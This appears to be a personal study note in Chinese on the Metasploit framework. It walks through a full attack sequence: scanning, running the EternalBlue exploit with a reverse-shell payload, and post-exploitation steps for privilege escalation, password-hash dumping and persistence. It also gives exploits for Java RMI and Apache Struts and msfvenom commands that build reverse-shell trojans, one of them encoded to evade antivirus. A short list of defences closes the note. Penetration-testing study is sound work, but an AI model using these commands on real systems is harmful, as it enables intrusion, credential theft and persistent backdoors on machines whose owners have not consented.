# Metasploit渗透测试框架学习笔记

## 什么是Metasploit?
Metasploit是世界上最流行的渗透测试框架，用于安全评估和漏洞利用。

## 架构组成

### 1. msfconsole
- 交互式命令行界面
- 最常用模块

### 2. msfvenom
- 生成恶意payload
- 编码器绕过检测

### 3. meterpreter
- 高级payload
- 内存中执行
- 多种系统控制

### 4. Armitage
- 图形化界面
- 自动化的渗透测试

## 核心概念

### 1. 模块类型
- `exploit` - 漏洞利用模块
- `payload` - 攻击载荷
- `auxiliary` - 辅助模块
- `post` - 后渗透模块
- `encoder` - 编码器
- `nop` - 空指令生成器

### 2. 工作空间
- 管理多个评估项目
- 分离数据
- 保持组织

### 3. 数据库
- 存储扫描结果
- 记录漏洞信息
- 追踪渗透过程

## 基本使用流程

### 1. 信息收集
```bash
# 端口扫描
db_nmap -sS -sV 192.168.1.1

# 服务识别
search auxiliary/scanner/http/
```

### 2. 选择漏洞利用模块
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set RPORT 445
```

### 3. 选择payload
```bash
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
```

### 4. 执行
```bash
exploit
```

## 常用命令

### 1. 模块管理
```bash
search <keyword>    # 搜索模块
use <module>        # 选择模块
show options        # 显示选项
set <option> <value>  # 设置选项
run                 # 执行
```

### 2. 后渗透
```bash
sysinfo             # 系统信息
getuid              # 当前用户
getsystem           # 提权
hashdump            # 获取密码哈希
```

### 3. 持久化
```bash
run persistence     # 开机自启
run metsvc          # Meterpreter服务
```

## 常见漏洞利用

### 1. EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit
```

### 2. Java RMI
```bash
use exploit/multi/misc/java_rmi_server
set RHOST <target>
set RPORT <port>
exploit
```

### 3. Apache Struts
```bash
use exploit/multi/http/struts2_content_type_ognl
set TARGETURI <uri>
set RHOST <target>
exploit
```

## 生成木马

### 1. 基本exe
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe
```

### 2. 加壳免杀
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
```

### 3. Linux后门
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
```

## 防御措施

### 1. 及时打补丁
- 定期更新系统
- 关注CVE公告

### 2. 防火墙
- 限制入站连接
- 关闭不必要的端口

### 3. 安全配置
- 禁用SMBv1
- 强化密码策略

### 4. 入侵检测
- 部署IDS/IPS
- 监控异常流量
- 日志分析

---
*学习时间: 2026-02-20*
*目标: 成为世界第一黑客*
